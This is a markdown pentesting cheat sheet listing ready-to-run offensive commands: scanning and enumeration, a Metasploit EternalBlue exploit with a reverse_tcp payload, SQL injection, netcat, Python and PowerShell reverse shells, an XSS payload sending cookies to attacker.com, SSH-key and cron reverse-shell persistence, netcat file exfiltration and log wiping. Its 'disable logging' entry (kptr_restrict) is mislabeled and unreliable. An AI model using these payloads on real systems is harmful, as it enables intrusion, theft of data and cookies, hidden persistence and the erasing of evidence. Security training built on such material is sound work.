# **Pentesting Cheat Sheet**

---

## **1. Reconnaissance & Scanning**

### 🔍 **Nmap - Network Scanning**

![Nmap Logo](https://upload.wikimedia.org/wikipedia/commons/9/94/Nmap_logo.png)

```bash
# Basic scan
nmap -sV -sC <target>

# Stealth scan
nmap -sS -T4 <target>

# Aggressive scan
nmap -A <target>

# Scan specific ports
nmap -p 22,80,443 <target>

# Detect OS
nmap -O <target>
```

### 🌐 **Subdomain Enumeration**

![Sublist3r Logo](https://upload.wikimedia.org/wikipedia/commons/5/5f/Globe.png)

```bash
# Using Sublist3r
sublist3r -d example.com

# Using Assetfinder
assetfinder --subs-only example.com

# Using Amass
amass enum -d example.com
```

### 📂 **Directory Enumeration**

![Gobuster Logo](https://upload.wikimedia.org/wikipedia/commons/8/89/Folder-blue.svg)

```bash
# Using dirb
dirb http://example.com

# Using gobuster
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

# Using ffuf
ffuf -u http://example.com/FUZZ -w /usr/share/wordlists/rockyou.txt
```

---

## **2. Exploitation**

### 🎯 **Metasploit - Exploit Framework**

![Metasploit Logo](https://upload.wikimedia.org/wikipedia/commons/4/4f/Metasploit_logo.svg)

```bash
# Start Metasploit
msfconsole

# Search for exploits
search exploit windows/smb

# Use an exploit
use exploit/windows/smb/ms17_010_eternalblue

# Set target
set RHOSTS <target-ip>

# Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# Exploit the target
exploit
```

### 🐍 **SQL Injection**

![SQL Injection Icon](https://upload.wikimedia.org/wikipedia/commons/3/3f/Database-icon.svg)

```sql
# Check for SQLi vulnerability
' OR '1'='1' --

# Dump database tables using sqlmap
sqlmap -u "http://example.com/page.php?id=1" --dbs

# Dump table contents
sqlmap -u "http://example.com/page.php?id=1" -D database_name --tables --dump
```

---

## **3. Post-Exploitation**

### 🔄 **Reverse Shells**

![Reverse Shell Icon](https://upload.wikimedia.org/wikipedia/commons/7/73/Linux_kernel_and_GNU_%28colored%29.svg)

**Netcat Reverse Shell**

```bash
# Attacker (listener)
nc -lvnp 4444

# Target (connect back)
nc <attacker-ip> 4444 -e /bin/bash
```

**Python Reverse Shell**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker-ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PowerShell Reverse Shell (Windows)**

```powershell
$client = New-Object System.Net.Sockets.TCPClient("<attacker-ip>",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

---

## **4. Web Application Attacks**

### 🚨 **Cross-Site Scripting (XSS)**

![XSS Icon](https://upload.wikimedia.org/wikipedia/commons/d/db/Script.svg)

```html
# Basic XSS Payload
<script>alert('XSS')</script>

# Stealing cookies
<script>new Image().src="http://attacker.com/steal.php?cookie="+document.cookie;</script>
```

---

## **5. Persistence & Backdoors**

### 🔑 **Adding SSH Key for Persistence**

```bash
echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys
```

### ⏳ **Creating a Cron Job for Persistence**

```bash
(crontab -l ; echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'") | crontab -
```

---

## **6. Data Exfiltration**

### 📤 **Using Netcat**

```bash
# Send a file
nc -w 3 <attacker-ip> 4444 < secret.txt

# Receive a file
nc -lvp 4444 > secret.txt
```

### 📡 **Using SCP**

```bash
# Transfer file from target to attacker
scp user@target:/path/to/file /local/destination
```

---

## **7. Clearing Tracks**

### 🧹 **Delete Bash History**

```bash
history -c && history -w
```

### 🗑️ **Remove Logs**

```bash
echo "" > /var/log/auth.log
echo "" > ~/.bash_history
```

### 🔇 **Disable Logging Temporarily**

```bash
echo 0 > /proc/sys/kernel/kptr_restrict
```

---

